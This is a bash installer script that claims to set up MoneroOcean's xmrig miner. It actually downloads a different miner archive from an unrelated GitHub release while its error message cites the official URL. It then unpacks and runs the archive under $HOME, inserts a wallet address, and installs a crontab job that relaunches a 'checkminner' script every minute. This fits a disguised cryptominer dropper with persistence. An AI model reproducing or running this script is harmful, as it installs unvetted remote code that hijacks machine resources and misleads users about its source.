#!/bin/bash
WALLET=$1


if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"

fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'

fi


echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://github.com/slicommeo/2019/releases/download/minner/aeminer2.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"

fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
[ -d $HOME/moneroocean ] || mkdir $HOME/moneroocean
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"

fi
rm /tmp/xmrig.tar.gz

sed -i 's/unknow/'$WALLET'/' $HOME/moneroocean/mine_aeternity.sh

chmod +x $HOME/moneroocean/mine_aeternity.sh
chmod +x $HOME/moneroocean/miner
chmod +x $HOME/moneroocean/checkminner.sh

(crontab -l 2>/dev/null || true; echo "*/1 * * * * sh $HOME/moneroocean/checkminner.sh") | crontab -
